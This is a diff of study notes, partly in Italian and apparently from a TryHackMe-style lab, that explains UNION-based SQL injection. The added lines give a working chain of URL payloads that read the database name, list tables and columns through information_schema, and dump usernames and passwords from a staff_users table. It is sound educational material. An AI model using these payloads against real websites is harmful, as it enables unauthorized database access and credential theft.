@@ -77,14 +77,30 @@ https://website-example.com/article?id=1 UNION SELECT 1
 La parte UNION SELECT 1 è ciò che rende questa query un tentativo di SQL injection.<br><br>
 
 UNION: L'operatore UNION combina i risultati di due o più query SELECT. Per funzionare correttamente, le query devono avere lo stesso numero di colonne e tipi di dati compatibili.<br>
-SELECT 1: Questa parte della query seleziona semplicemente il valore 1. Non specifica alcuna tabella, quindi non sta cercando di estrarre dati da una tabella esistente.<br>
+SELECT 1: Questa parte della query seleziona semplicemente il valore 1. Non specifica alcuna tabella, quindi non sta cercando di estrarre dati da una tabella esistente.<br><br>
 
 
+we'll get the database name that we have access to:
+```
+https://website-example.com/article?id=0 UNION SELECT 1,2,database()
+```
+
+Our next query will gather a list of tables that are in this database.
+```
+https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(table_name) FROM information_schema.tables WHERE table_schema = 'sqli_one'
+```
 
 
+We can utilise the information_schema database again to find the structure of this table using the below query.
+```
+https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(column_name) FROM information_schema.columns WHERE table_name = 'staff_users'
+```
 
+The query results provide three columns for the staff_users table: id, password, and username. We can use the username and password columns for our following query to retrieve the user's information.
 
-
+```
+https://website.thm/article?id=0 UNION SELECT 1,2,group_concat(username,':',password SEPARATOR '<br>') FROM staff_users
+```
 
 
 
